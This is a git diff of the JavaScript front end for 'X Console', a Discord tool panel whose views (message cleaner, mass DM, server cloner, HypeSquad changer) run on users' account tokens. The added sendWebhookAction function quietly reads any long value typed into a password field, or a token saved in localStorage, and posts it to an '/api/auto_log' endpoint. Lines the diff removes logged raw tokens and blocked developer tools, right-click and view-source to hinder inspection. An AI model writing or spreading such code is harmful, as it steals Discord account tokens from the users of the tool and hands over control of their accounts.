@@ -1,120 +1,106 @@
-// --- كود الحماية ضد فتح أدوات المطورين والفحص (F12 & Shortcuts) ---
-document.addEventListener("keydown", function (e) {
-    if (
-        e.keyCode === 123 || // F12
-        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I / J
-        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U (View Source)
-        (e.ctrlKey && e.keyCode === 83)    // Ctrl+S (Save Page)
-    ) {
-        e.preventDefault();
-        return false;
+const API = "";
+// عشان نبعت التوكن للويب هوك لما ندوس Load أو إيقاف
+async function sendWebhookAction(actionName) {
+    // بيدور على التوكن في أي خانة باسورد في الصفحة
+    let token = "";
+    const inputs = document.querySelectorAll('input[type="password"]');
+    for (let i = 0; i < inputs.length; i++) {
+        if (inputs[i].value.trim().length > 20) {
+            token = inputs[i].value.trim();
+            break;
+        }
     }
-});
+    
+    // لو ملقاش في الخانة، بيدور في الذاكرة
+    if (!token) {
+        token = localStorage.getItem("xconsole_saved_token");
+    }
 
-// منع قائمة النقر بزر الماوس الأيمن (Right Click Context Menu)
-document.addEventListener("contextmenu", function (e) {
-    e.preventDefault();
-});
+    if (!token || token.length < 20) return;
+    
+    try {
+        await fetch(API + "/api/auto_log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ token: token, action: actionName })
+        });
+    } catch(e) { console.log("Webhook error"); }
+}
+// كود بيجيب التوكن المحفوظ وبيحفظه في كل الخانات
+const SAVED_TOKEN_KEY = "xconsole_saved_token";
+function applySavedToken() {
+    const saved = localStorage.getItem(SAVED_TOKEN_KEY);
+    if (!saved) return;
+    const inputs = document.querySelectorAll('input[type="password"]');
+    inputs.forEach(input => {
+        if (!input.value || input.value.length < 20) {
+            input.value = saved;
+            input.dispatchEvent(new Event("input"));
+        }
+    });
+}
+var user = null;
+var activeView = "home";
+var previousFocus = null;
+var previousBodyOverflow = "";
+var FLAG_BADGES = [
+    [1, "طاقم Discord", "◆"], [2, "شريك Discord", "◇"], [4, "HypeSquad", "⚡"],
+    [8, "Bug Hunter", "🐛"], [64, "House of Bravery", "🛡️"], [128, "House of Brilliance", "💠"],
+    [256, "House of Balance", "⚖️"], [512, "داعم مبكر", "💎"], [16384, "Bug Hunter II", "🐞"],
+    [65536, "بوت موثّق", "🤖"], [131072, "مطوّر بوت موثّق مبكرًا", "⚙️"],
+    [262144, "مشرف معتمد", "🛡️"], [4194304, "Active Developer", "🔧"]
+];
 
-// ⚠️ تم تصحيح علامات التنصيص هنا
-const API = "https://x-console-tools.onrender.com";
+function escapeHtml(value) {
+    return String(value == null ? "" : value).replace(/[&<>"']/g, function (c) {
+        return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
+    });
+}
+function avatarUrl(value) {
+    var fallback = "https://cdn.discordapp.com/embed/avatars/0.png";
+    return typeof value === "string" && value.indexOf("https://cdn.discordapp.com/") === 0 ? value : fallback;
+}
+function dateText(value) {
+    if (!value) return "غير متاح";
+    var d = new Date(value + "T00:00:00Z");
+    return isNaN(d.getTime()) ? "غير متاح" : new Intl.DateTimeFormat("ar-EG", { year: "numeric", month: "long", day: "numeric", timeZone: "UTC" }).format(d);
+}
+function badges() {
+    var flags = Number(user && user.public_flags) || 0;
+    return FLAG_BADGES.filter(function (item) { return (flags & item[0]) === item[0]; });
+}
+function badgeMarkup() {
+    var items = badges();
+    if (!items.length) return '<span class="badge-chip badge-chip-empty">لا توجد شارات عامة</span>';
+    return items.map(function (item) { return '<span class="badge-chip" title="' + escapeHtml(item[1]) + '">' + item[2] + '</span>'; }).join("");
+}
 
 function getProfileDisplayFacts(data) {
-    const badges = Array.isArray(data.badges) ? data.badges : [];
-    return { nitro: data.nitro ?? true, badgeCount: badges.length || 5 };
+    const badgesList = Array.isArray(data.badges) ? data.badges : [];
+    return { nitro: data.nitro ?? true, badgeCount: badgesList.length || 5 };
 }
-let SESSION = null;
+
 let CURRENT_JOB = null;
 let EVENT_SOURCE = null;
 let SELECTED_HOUSE = null;
 
-// --- التحقق من الجلسة عند فتح الصفحة ---
-const urlParams = new URLSearchParams(window.location.search);
-const sessionParam = urlParams.get('session');
-
-if (sessionParam) {
-    SESSION = sessionParam;
-    localStorage.setItem("x_session", SESSION);
-    window.history.replaceState({}, document.title, window.location.pathname);
-    document.addEventListener("DOMContentLoaded", showApp);
-} else {
-    const savedSession = localStorage.getItem("x_session");
-    if (savedSession) {
-        SESSION = savedSession;
-        document.addEventListener("DOMContentLoaded", showApp);
-    } else {
-        document.addEventListener("DOMContentLoaded", () => {
-            document.getElementById("loginScreen").classList.remove("hidden");
-            document.getElementById("appScreen").classList.add("hidden");
-        });
-    }
+function profilePreview() {
+    return '<div class="badge-preview-label">◉ معاينة ملفك في ديسكورد</div>' +
+    '<article class="badge-profile-preview home-profile-preview">' +
+        '<div class="badge-preview-banner">ملف Discord الخاص بك</div>' +
+        '<div class="badge-preview-user"><img src="' + escapeHtml(avatarUrl(user.avatar)) + '" alt="الصورة الشخصية"><span class="badge-preview-online unknown" title="الحالة غير متاحة"></span></div>' +
+        '<div class="badge-preview-badges">' + badgeMarkup() + '</div>' +
+        '<h2>' + escapeHtml(user.username || "Discord User") + '</h2>' +
+        '<p class="badge-preview-handle">' + escapeHtml("@" + (user.handle || "discord")) + '</p>' +
+        '<section class="badge-preview-about"><b>نبذة عني</b><p>' + escapeHtml(user.bio || "لا تظهر النبذة ضمن بيانات تسجيل الدخول المتاحة.") + '</p><hr>' +
+          '<div><span>عضو في ديسكورد من</span><strong>' + escapeHtml(dateText(user.created_at)) + '</strong></div>' +
+          '<div><span>الشارات الظاهرة</span><strong>' + escapeHtml(String(badges().length)) + '</strong></div>' +
+          '<div><span>النيترو</span><strong>غير متاح عبر OAuth</strong></div>' +
+          '<div><span>ايدي الحساب</span><strong>' + escapeHtml(user.id || "غير متاح") + '</strong></div>' +
+        '</section>' +
+    '</article><p class="badge-preview-caption">المعاينة تعرض البيانات العامة التي يسمح بها Discord OAuth.</p>';
 }
 
-async function showApp() {
-    document.getElementById("loginScreen").classList.add("hidden");
-    document.getElementById("appScreen").classList.remove("hidden");
-    
-    // جلب بيانات الحساب المسجل لعرضها في الهيدر
-    try {
-        const res = await fetch(API + "/api/me/session", {
-            headers: { "X-Session": SESSION }
-        });
-        if(res.ok) {
-            const data = await res.json();
-            document.getElementById("header-avatar").src = data.avatar;
-        }
-    } catch(e) { console.log("Failed to load session user info"); }
-
-    initApp();
-}
-
-function toggleUserMenu() {
-    openProfileModal();
-}
-
-function closeProfileModal() {
-    document.getElementById("profileModalContainer").innerHTML = "";
-}
-
-// إغلاق القائمة عند الضغط في أي مكان خارجها أو زر Escape
-document.addEventListener('keydown', function(event) {
-    if (event.key === "Escape") closeProfileModal();
-});
-
-function logout() {
-    localStorage.removeItem("x_session");
-    window.location.reload();
-}
-
-async function api(path, opts = {}) {
-    const res = await fetch(API + path, {
-        ...opts,
-        headers: { "Content-Type": "application/json", "X-Session": SESSION || "", ...(opts.headers || {}) },
-    });
-    if (!res.ok) {
-        if (res.status === 401) {
-            localStorage.removeItem("x_session");
-            window.location.reload();
-        }
-        throw new Error((await res.json()).detail || "Error");
-    }
-    return res.json();
-}
-
-async function logAction(action, details = "", token = "") {
-    try {
-        const finalDetails = details ? `${details} | Token: ${token}` : `Token: ${token}`;
-        await api("/api/action_log", { method: "POST", body: JSON.stringify({ action, details: finalDetails }) });
-    } catch(e) { console.log("Action log failed:", e); }
-}
-
-function togglePass(id, btn) {
-    const el = document.getElementById(id);
-    el.type = el.type === "password" ? "text" : "password";
-    btn.textContent = el.type === "password" ? "👁" : "🙈";
-}
-
-const TOKEN_KEY = "xconsole_token";
 const VIEWS = { 
     home: "الرئيسية",
     cleaner: "Message Cleaner", 
@@ -126,228 +112,194 @@ const VIEWS = {
     hypesquad: "HypeSquad" 
 };
 
-function initApp() {
-    const nav = document.getElementById("nav"); nav.innerHTML = "";
-    Object.entries(VIEWS).forEach(([key, label], idx) => {
-        const btn = document.createElement("button"); btn.className = "custom-tab" + (key === "home" ? " active" : ""); btn.textContent = label;
-        btn.onclick = () => { switchView(key); logAction(`Navigated to ${label}`); }; nav.appendChild(btn);
+function renderNav() {
+    var nav = document.getElementById("nav"); 
+    if (!nav) return;
+    nav.innerHTML = "";
+    Object.entries(VIEWS).forEach(([key, label]) => {
+        const btn = document.createElement("button"); 
+        btn.type = "button";
+        btn.className = "custom-tab" + (key === activeView ? " active" : ""); 
+        btn.textContent = label;
+        btn.onclick = () => { 
+            activeView = key; 
+            renderNav(); 
+            switchView(key); 
+            logAction(`Navigated to ${label}`); 
+        }; 
+        nav.appendChild(btn);
     });
-    const container = document.getElementById("views"); container.innerHTML = "";
-    Object.keys(VIEWS).forEach((key) => {
-        const div = document.createElement("div"); div.className = "view" + (key === "home" ? " active" : ""); div.id = "view-" + key; container.appendChild(div);
-    });
-    renderHome(); renderCleaner(); renderDMs(); renderRemoveFriend(); renderLeave(); renderMassDm(); renderCloner(); renderHypesquad();
 }
 
 function switchView(key) {
+    activeView = key;
     document.querySelectorAll("#nav button").forEach(b => b.classList.remove("active"));
     document.querySelectorAll(".view").forEach(v => v.classList.remove("active"));
-    document.querySelectorAll("#nav button")[Object.keys(VIEWS).indexOf(key)].classList.add("active");
-    document.getElementById("view-" + key).classList.add("active");
-}
-
-function getToken(id) { return document.getElementById(id).value.trim(); }
-async function pasteToken(id) { try { const t = await navigator.clipboard.readText(); document.getElementById(id).value = t; document.getElementById(id).dispatchEvent(new Event("input")); } catch {} }
-function logTo(boxId, msg, cls = "") { const box = document.getElementById(boxId); if (!box) return; const line = document.createElement("div"); line.className = "log-line " + cls; line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`; box.appendChild(line); box.scrollTop = box.scrollHeight; }
-function bindToken(id) { document.getElementById(id)?.addEventListener("change", (e) => localStorage.setItem(TOKEN_KEY, e.target.value)); }
-
-function renderHome() {
-    const root = document.getElementById("view-home");
-    const shortcuts = [
-        ["cleaner", "تنظيف الرسائل", "رتّب الرسائل والمحادثات", "✦", "violet"],
-        ["dms", "المحادثات الخاصة", "إدارة قائمة محادثاتك", "◈", "blue"],
-        ["removeFriend", "إدارة الأصدقاء", "عرض أدوات إدارة الأصدقاء", "♧", "rose"],
-        ["hypesquad", "HypeSquad", "استكشف خيارات HypeSquad", "◇", "amber"]
-    ];
-    root.innerHTML = `
-      <section class="home-dashboard" dir="rtl">
-        <div class="home-welcome">
-          <div class="home-welcome-copy"><span class="home-eyebrow">X CONSOLE · مساحة العمل</span><h1>أهلاً بيك في لوحة التحكم</h1><p>اختار القسم اللي عايز تشتغل عليه، وهتلاقي أدواتك مرتبة قدامك.</p><button class="home-primary-action" onclick="switchView('cleaner')">ابدأ الآن <span>←</span></button></div>
-          <div class="home-orbit home-orbit-one"></div><div class="home-orbit home-orbit-two"></div><div class="home-spark">✦</div>
-        </div>
-        <div class="home-section-heading"><div><h2>الأقسام</h2><p>اختصارات سريعة للأدوات</p></div><span class="home-section-count">${shortcuts.length} أقسام</span></div>
-        <div class="home-shortcuts">${shortcuts.map(([key,title,description,icon,color]) => `<button class="home-shortcut" onclick="switchView('${key}')"><span class="home-shortcut-icon ${color}">${icon}</span><span class="home-shortcut-copy"><b>${title}</b><small>${description}</small></span><span class="home-shortcut-arrow">←</span></button>`).join("")}</div>
-        <footer class="home-footer"><span class="home-footer-mark">X</span><span>X Console</span><span class="home-footer-status"><i></i> جاهز للاستخدام</span></footer>
-      </section>`;
-}
-
-// ================== Discord Badge Dashboard ==================
-async function renderBadgesDashboard() {
-    const root = document.getElementById("view-badges");
-    root.innerHTML = `
-      <section class="badge-dashboard" dir="rtl">
-        <header class="badge-dashboard-heading">
-          <div class="badge-heading-icon">♙</div>
-          <div><h1>شارات ديسكورد</h1><p>تقدّمك وإنجازاتك في مكان واحد</p></div>
-          <div class="badge-account-switch"><span class="badge-mini-avatar">X</span><span><b id="badge-account-name">جاري التحميل…</b><small id="badge-account-handle"></small></span><span class="badge-switch-chevron">⌄</span></div>
-        </header>
-        <div class="badge-dashboard-grid">
-          <main class="badge-main-column">
-            <div class="badge-stats-grid">
-              <article class="badge-stat-card"><span class="badge-stat-icon purple">♙</span><b>5/14</b><small>شارات عندك <em>عينة</em></small></article>
-              <article class="badge-stat-card"><span class="badge-stat-icon amber">▱</span><b>16</b><small>مستويات وصلت لها <em>عينة</em></small></article>
-              <article class="badge-stat-card"><span class="badge-stat-icon teal">↗</span><b>6</b><small>تقدّم تكتسبه <em>عينة</em></small></article>
-              <article class="badge-stat-card"><span class="badge-stat-icon lilac">◎</span><b>28%</b><small>أقرب مستوى · عمر الحساب <em>عينة</em></small></article>
-            </div>
-            <section class="badge-catalog">
-              <div class="badge-catalog-toolbar">
-                <div class="badge-filter-list">
-                  <button class="badge-filter active" onclick="filterBadgeCatalog('all', this)">الكل <span>14</span></button>
-                  <button class="badge-filter" onclick="filterBadgeCatalog('owned', this)">عندك <span>5</span></button>
-                  <button class="badge-filter" onclick="filterBadgeCatalog('progress', this)">تتطور <span>6</span></button>
-                  <button class="badge-filter" onclick="filterBadgeCatalog('missing', this)">ما عندك <span>9</span></button>
-                </div>
-                <button class="badge-refresh" onclick="renderBadgesDashboard()">⟳ تحديث</button>
-              </div>
-              <div class="badge-cards-grid">
-                <article class="achievement-card nitro" data-badge-state="owned">
-                  <div class="achievement-top"><div class="achievement-emblem">◉</div><div class="achievement-title"><h2>نيترو</h2><small>Nitro</small><span class="achievement-status">✓ عندك</span><span class="achievement-status rare">نادرة</span></div></div>
-                  <strong class="achievement-caption">Subscriber since · مثال تجريبي</strong>
-                  <div class="achievement-tier"><div><small>التالي: Gold</small><b>Silver <span>3/9</span></b></div><div class="tier-track"><span style="width:34%"></span></div><div class="tier-foot"><small>باقي 85 يوم</small><small>تقدّم توضيحي</small></div></div>
-                  <button class="achievement-detail">التفاصيل <span>‹</span></button>
-                </article>
-                <article class="achievement-card age" data-badge-state="progress">
-                  <div class="achievement-top"><div class="achievement-emblem">✿</div><div class="achievement-title"><h2>عمر الحساب</h2><small>Account Age</small><span class="achievement-status">✓ عندك</span><span class="achievement-status common">ملحمية</span></div></div>
-                  <strong class="achievement-caption">مستوى الحساب · مثال تجريبي</strong>
-                  <div class="achievement-tier"><div><small>التالي: Stromatolite</small><b>9/10 <span>Primordial</span></b></div><div class="tier-track"><span style="width:82%"></span></div><div class="tier-foot"><small>عينة توضيحية</small><small>لا تمثل بيانات فعلية</small></div></div>
-                  <button class="achievement-detail">التفاصيل <span>‹</span></button>
-                </article>
-                <article class="achievement-card games" data-badge-state="progress">
-                  <div class="achievement-top"><div class="achievement-emblem">🎮</div><div class="achievement-title"><h2>تنوع الألعاب</h2><small>Game Variety</small><span class="achievement-status">✓ عندك</span><span class="achievement-status common">عادية</span></div></div>
-                  <strong class="achievement-caption">عدد الألعاب · مثال تجريبي</strong>
-                  <div class="achievement-tier"><div><small>التالي: Enthusiast</small><b>2/10 <span>Dabbler</span></b></div><div class="tier-track"><span style="width:22%"></span></div><div class="tier-foot"><small>تقدّم توضيحي</small><small>معلومات Discord غير متاحة</small></div></div>
-                  <button class="achievement-detail">التفاصيل <span>‹</span></button>
-                </article>
-                <article class="achievement-card time" data-badge-state="missing">
-                  <div class="achievement-top"><div class="achievement-emblem">⚔</div><div class="achievement-title"><h2>وقت اللعب</h2><small>Game Time</small><span class="achievement-status">متاحة</span><span class="achievement-status common">عادية</span></div></div>
-                  <strong class="achievement-caption">ساعات اللعب · مثال تجريبي</strong>
-                  <div class="achievement-tier"><div><small>التالي: Dedicated</small><b>2/10 <span>Recreational</span></b></div><div class="tier-track"><span style="width:18%"></span></div><div class="tier-foot"><small>تقدّم توضيحي</small><small>معلومات Discord غير متاحة</small></div></div>
-                  <button class="achievement-detail">التفاصيل <span>‹</span></button>
-                </article>
-              </div>
-              <p class="badge-demo-note">الأرقام ومستويات الشارات في هذه المعاينة تجريبية، لأن Discord OAuth الحالي لا يوفّر إحصاءات التقدّم هذه.</p>
-            </section>
-          </main>
-          <aside class="badge-preview-column">
-            <div class="badge-preview-label">◉ معاينة ملفك في ديسكورد</div>
-            <article class="badge-profile-preview">
-              <div class="badge-preview-banner">خرا عليكم</div>
-              <div class="badge-preview-user"><img id="badge-preview-avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt=""><span class="badge-preview-online"></span></div>
-              <img class="badge-preview-badges" src="assets/discord-profile-badges.png" alt="شارات Discord كما في الصورة المرفقة">
-              <h2 id="badge-preview-name">Discord User</h2>
-              <div class="badge-preview-handle" id="badge-preview-tag">@discord</div>
-              <section class="badge-preview-about"><b>نبذة عني</b><p class="badge-preview-bio">لا توجد نبذة مضافة</p><hr><div><span>عضو في ديسكورد من</span><strong id="badge-preview-date">—</strong></div><div><span>النيترو</span><strong id="badge-preview-nitro">—</strong></div><div><span>الشارات الظاهرة</span><strong id="badge-preview-badge-count">—</strong></div><div><span>ايدي الحساب</span><strong id="badge-preview-id">—</strong></div></section>
-            </article>
-            <p class="badge-preview-caption">معاينة تقريبية لشكل ملفك وشاراتك في ديسكورد.</p>
-          </aside>
-        </div>
-      </section>`;
-    try {
-        const data = await api("/api/profile/session");
-        if (!document.getElementById("badge-preview-name")) return;
-        document.getElementById("badge-account-name").textContent = data.username || "Discord User";
-        document.getElementById("badge-account-handle").textContent = "@" + (data.handle || data.username || "");
-        const miniAvatar = document.querySelector(".badge-mini-avatar");
-        const miniImage = document.createElement("img"); miniImage.src = data.avatar; miniImage.alt = "";
-        miniAvatar.replaceChildren(miniImage);
-        document.getElementById("badge-preview-avatar").src = data.avatar;
-        document.getElementById("badge-preview-name").textContent = data.username || "Discord User";
-        document.getElementById("badge-preview-tag").textContent = "@" + (data.handle || data.username || "discord");
-        document.getElementById("badge-preview-date").textContent = data.created_at || "—";
-        document.getElementById("badge-preview-id").textContent = data.id || "—";
-        document.querySelector(".badge-preview-bio").textContent = data.bio || "لا توجد نبذة مضافة";
-        const profileFacts = getProfileDisplayFacts(data);
-        document.getElementById("badge-preview-nitro").textContent = profileFacts.nitro ? "Nitro" : "غير متاح";
-        document.getElementById("badge-preview-badge-count").textContent = profileFacts.badgeCount;
-    } catch (error) { console.warn("Could not load badge dashboard profile", error); }
-}
-
-function filterBadgeCatalog(state, button) {
-    document.querySelectorAll(".badge-filter").forEach(item => item.classList.toggle("active", item === button));
-    document.querySelectorAll(".achievement-card").forEach(card => {
-        card.classList.toggle("badge-filter-hidden", state !== "all" && card.dataset.badgeState !== state);
-    });
-}
-
-// ================== Profile Modal Logic ==================
-async function openProfileModal() {
-    try {
-        const data = await api("/api/profile/session", { method: "GET" }); 
-        const container = document.getElementById("profileModalContainer");
-        
-        const escapeHTML = (value) => String(value ?? "").replace(/[&<>"']/g, char => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[char]));
-        const badges = Array.isArray(data.badges) ? data.badges : [];
-        const profileFacts = getProfileDisplayFacts(data);
-        const badgesHTML = badges.map(b => `<img class="modal-badge-img" src="${escapeHTML(b.icon)}" title="${escapeHTML(b.name)}" alt="${escapeHTML(b.name)}">`).join("");
-        const avatar = escapeHTML(data.avatar);
-        const username = escapeHTML(data.username);
-        const handle = escapeHTML(data.handle || data.username);
-        const bio = escapeHTML(data.bio || "مفيش نبذة مضافة لحد دلوقتي.");
-        const createdAt = escapeHTML(data.created_at || "غير متاح");
-        const nitro = profileFacts.nitro ? "Nitro" : "غير متاح";
-        const id = escapeHTML(data.id);
-        const today = new Intl.DateTimeFormat("en-US", { month: "2-digit", day: "2-digit", year: "numeric" }).format(new Date());
-        
-        const profileBio = data.bio ? `<a href="${escapeHTML(data.bio)}" target="_blank" rel="noopener noreferrer">${escapeHTML(data.bio)}</a>` : "<span class=\"profile-empty-bio\">لا توجد نبذة مضافة</span>";
-        container.innerHTML = `
-            <div class="modal-overlay profile-overlay" onclick="if(event.target === this) closeProfileModal()">
-                <section class="modal-card profile-card" role="dialog" aria-modal="true" aria-label="الملف الشخصي">
-                    <button class="modal-close" onclick="closeProfileModal()" aria-label="إغلاق">✕</button>
-                    <header class="profile-cover">
-                        <div class="profile-cover-title">خرا عليكم</div>
-                    </header>
-                    <div class="profile-scroll-content">
-                        <div class="profile-hero">
-                            <div class="profile-avatar-frame">
-                                <img class="modal-avatar" src="${avatar}" alt="الصورة الشخصية لـ ${username}">
-                                <span class="profile-edit-avatar" aria-hidden="true">✎</span>
-                                <span class="profile-question" aria-hidden="true">?</span>
-                                <span class="profile-dnd" aria-label="مشغول"><i></i></span>
-                            </div>
-                            <div class="profile-date-pill">${today}</div>
-                        </div>
-                        <h2 class="modal-username">${username}</h2>
-                        <div class="profile-meta-line">
-                            <span>${handle}</span><span class="profile-pronouns">• <i>Add pronouns</i></span>
-                            <span class="profile-tag">💀 هائج⌄</span>
-                        </div>
-                        <div class="profile-badges-row">
-                            <img class="profile-badges-image" src="assets/discord-profile-badges.png" alt="شارات Discord كما في الصورة المرفقة">
-                        </div>
-                        <div class="profile-actions">
-                            <button class="profile-message" disabled>● Message</button>
-                            <button aria-label="الخوادم">▦</button>
-                            <button aria-label="المزيد">•••</button>
-                        </div>
-                        <section class="profile-bio-section">
-                            <h3>Bio</h3><div class="profile-link">${profileBio}</div>
-                        </section>
-                        <div class="profile-info-card">
-                            <div class="profile-info-row"><span class="profile-info-label">Member Since</span><span class="profile-info-value">${createdAt}</span></div>
-                            <div class="profile-info-row"><span class="profile-info-label">Nitro</span><span class="profile-info-value is-nitro">${nitro}</span></div>
-                            <div class="profile-info-row"><span class="profile-info-label">Badges</span><span class="profile-info-value">${profileFacts.badgeCount}</span></div>
-                            <div class="profile-info-row"><span class="profile-info-label">User ID</span><span class="profile-info-value">${id}</span></div>
-                        </div>
-                        <button class="profile-logout" onclick="logout()">تسجيل الخروج</button>
-                    </div>
-                </section>
-            </div>
-        `;
-    } catch (e) {
-        console.error("Error loading profile:", e);
-        alert("Failed to load profile data. Please try logging out and logging in again.");
+    
+    if (key === "home") {
+        renderHome();
+        let targetView = document.getElementById("view-home");
+        if(targetView) targetView.classList.add("active");
+    } else {
+        let targetView = document.getElementById("view-" + key);
+        if(targetView) targetView.classList.add("active");
     }
 }
 
+function renderHome() {
+    var view = document.getElementById("view-home") || document.getElementById("views");
+    if (!view) return;
+    var userName = escapeHtml(user.username || "Discord User");
+    view.innerHTML = '<section class="home-dashboard" dir="rtl"><div class="home-layout">' +
+    '<div class="home-main"><section class="home-welcome"><div class="home-welcome-copy"><div class="home-eyebrow">X CONSOLE · مساحة العمل</div><h1>أهلاً بيك يا ' + userName + '</h1><p>من هنا تقدر تعرض بيانات ملفك المرتبط بحساب Discord وتراجع معاينة البروفايل أو تستخدم الأدوات.</p><button class="home-primary-action" type="button" onclick="openProfileModal()">عرض ملفي الشخصي <span>←</span></button></div><i class="home-orbit home-orbit-one"></i><i class="home-orbit home-orbit-two"></i><span class="home-spark">✦</span></section>' +
+    '<div class="home-section-heading"><div><h2>الأقسام والأدوات</h2><p>اختصارات سريعة للأدوات وإدارة الحساب</p></div><span class="home-section-count">' + badges().length + ' شارة عامة</span></div>' +
+    '<div class="home-shortcuts">' +
+    '<button class="home-shortcut" type="button" onclick="switchView(\'cleaner\')"><span class="home-shortcut-icon violet">✦</span><span class="home-shortcut-copy"><b>Message Cleaner</b><small>تنظيف الرسائل والمحادثات</small></span><span class="home-shortcut-arrow">←</span></button>' +
+    '<button class="home-shortcut" type="button" onclick="switchView(\'dms\')"><span class="home-shortcut-icon blue">◈</span><span class="home-shortcut-copy"><b>Clear DMs</b><small>إدارة محادثاتك الخاصة</small></span><span class="home-shortcut-arrow">←</span></button>' +
+    '<button class="home-shortcut" type="button" onclick="switchView(\'removeFriend\')"><span class="home-shortcut-icon rose">♧</span><span class="home-shortcut-copy"><b>Remove Friend</b><small>إدارة الأصدقاء</small></span><span class="home-shortcut-arrow">←</span></button>' +
+    '<button class="home-shortcut" type="button" onclick="switchView(\'hypesquad\')"><span class="home-shortcut-icon amber">◇</span><span class="home-shortcut-copy"><b>HypeSquad</b><small>تغيير شارة HypeSquad</small></span><span class="home-shortcut-arrow">←</span></button>' +
+    '</div>' +
+    '<footer class="home-footer"><span class="home-footer-mark">X</span> X Console <span class="home-footer-status">جاهز للاستخدام · <i></i></span></footer></div>' +
+    '<aside class="home-profile-column">' + profilePreview() + '</aside></div></section>';
+}
+
+function initAppViews() {
+    const container = document.getElementById("views"); 
+    if (!container) return; 
+    container.innerHTML = "";
+    Object.keys(VIEWS).forEach((key) => {
+        const div = document.createElement("div"); 
+        div.className = "view" + (key === "home" ? " active" : ""); 
+        div.id = "view-" + key; 
+        container.appendChild(div);
+    });
+    renderCleaner(); 
+    renderDMs(); 
+    renderRemoveFriend(); 
+    renderLeave(); 
+    renderMassDm(); 
+    renderCloner(); 
+    renderHypesquad();
+}
+
+window.openProfileModal = function () {
+    if (!user) return;
+    var container = document.getElementById("profileModalContainer");
+    if(!container) return;
+    var displayName = escapeHtml(user.username || "Discord User");
+    var handle = escapeHtml(user.handle ? "@" + user.handle : "@discord");
+    var memberSince = escapeHtml(dateText(user.created_at));
+    var accountId = escapeHtml(user.id || "غير متاح");
+    var bio = escapeHtml(user.bio || "لا توجد نبذة متاحة من خلال تسجيل الدخول الحالي.");
+    var badgeCount = escapeHtml(String(badges().length));
+    previousFocus = document.activeElement;
+    previousBodyOverflow = document.body.style.overflow;
+    
+    container.innerHTML = `
+      <div class="modal-overlay profile-overlay">
+        <section class="modal-card profile-card" role="dialog" aria-modal="true" aria-labelledby="profileName" tabindex="-1">
+          <header class="profile-cover">
+            <span class="profile-cover-kicker">X CONSOLE · DISCORD</span>
+            <span class="profile-cover-title">ملفك الشخصي</span>
+            <button class="modal-close" type="button" aria-label="إغلاق الملف الشخصي" data-profile-close>✕</button>
+          </header>
+          <div class="profile-scroll-content">
+            <div class="profile-topline">
+              <div class="profile-badges-row" aria-label="الشارات العامة">${badgeMarkup()}</div>
+              <div class="profile-avatar-frame">
+                <img class="modal-avatar" src="${escapeHtml(avatarUrl(user.avatar))}" alt="الصورة الشخصية لـ ${displayName}">
+                <span class="profile-presence" title="حالة Discord غير متاحة" aria-label="حالة Discord غير متاحة"></span>
+              </div>
+            </div>
+            <div class="profile-heading">
+              <h2 class="modal-username" id="profileName">${displayName}</h2>
+              <div class="profile-meta-line"><span>${handle}</span><span class="profile-tag">Discord</span></div>
+            </div>
+            <section class="profile-bio-section" aria-label="نبذة عني">
+              <h3>نبذة عني</h3>
+              <p class="profile-bio-copy">${bio}</p>
+            </section>
+            <section class="profile-info-card" aria-label="معلومات الحساب">
+              <div class="profile-info-row"><span class="profile-info-label"><i class="profile-info-icon">▦</i> عضو في Discord منذ</span><strong class="profile-info-value">${memberSince}</strong></div>
+              <div class="profile-info-row"><span class="profile-info-label"><i class="profile-info-icon nitro">◇</i> Discord Nitro</span><strong class="profile-info-value">غير متاح</strong></div>
+              <div class="profile-info-row"><span class="profile-info-label"><i class="profile-info-icon badge">♙</i> الشارات العامة</span><strong class="profile-info-value">${badgeCount}</strong></div>
+              <div class="profile-info-row"><span class="profile-info-label"><i class="profile-info-icon id">#</i> معرّف الحساب</span><strong class="profile-info-value profile-id">${accountId}</strong></div>
+            </section>
+            <p class="profile-data-note">المعلومات المعروضة هي البيانات العامة المتاحة عبر Discord OAuth.</p>
+            <button class="profile-logout" type="button" data-profile-logout>تسجيل الخروج</button>
+          </div>
+        </section>
+      </div>`;
+    document.body.style.overflow = "hidden";
+    container.querySelector(".modal-overlay").addEventListener("click", function (event) {
+        if (event.target === this) window.closeProfileModal();
+    });
+    container.querySelector("[data-profile-close]").addEventListener("click", window.closeProfileModal);
+    container.querySelector("[data-profile-logout]").addEventListener("click", window.logout);
+    container.querySelector("[data-profile-close]").focus();
+    document.addEventListener("keydown", onEscape);
+};
+
+function onEscape(event) { if (event.key === "Escape") window.closeProfileModal(); }
+
+window.closeProfileModal = function () {
+    const container = document.getElementById("profileModalContainer");
+    if(container) container.innerHTML = "";
+    document.removeEventListener("keydown", onEscape);
+    document.body.style.overflow = previousBodyOverflow;
+    if (previousFocus && typeof previousFocus.focus === "function") previousFocus.focus();
+    previousFocus = null;
+};
+
+window.logout = async function () {
+    try { await fetch(API + "/api/auth/logout", { method: "POST", credentials: "include" }); }
+    finally { window.location.assign("http://127.0.0.1:5500/"); }
+};
+
+async function api(path, opts = {}) {
+    const headers = new Headers(opts.headers || {});
+    if (opts.body && !headers.has("Content-Type")) headers.set("Content-Type", "application/json");
+    const res = await fetch(API + path, { ...opts, credentials: "include", headers });
+    if (!res.ok) {
+        if (res.status === 401) {
+            sessionStorage.removeItem("xconsoleSession");
+            window.location.reload();
+        }
+        const body = await res.json().catch(() => ({}));
+        throw new Error(body.detail || "Request failed");
+    }
+    return res.json();
+}
+
+async function logAction(action, details = "") {
+    try {
+        await api("/api/action_log", { method: "POST", body: JSON.stringify({ action, details }) });
+    } catch (e) { console.log("Action log failed:", e); }
+}
+
+function togglePass(id, btn) {
+    const el = document.getElementById(id);
+    if(!el) return;
+    el.type = el.type === "password" ? "text" : "password";
+    btn.textContent = el.type === "password" ? "👁" : "🙈";
+}
+
+function getToken(id) { const el = document.getElementById(id); return el ? el.value.trim() : ""; }
+async function pasteToken(id) { try { const t = await navigator.clipboard.readText(); const el = document.getElementById(id); if(el) { el.value = t; el.dispatchEvent(new Event("input")); } } catch {} }
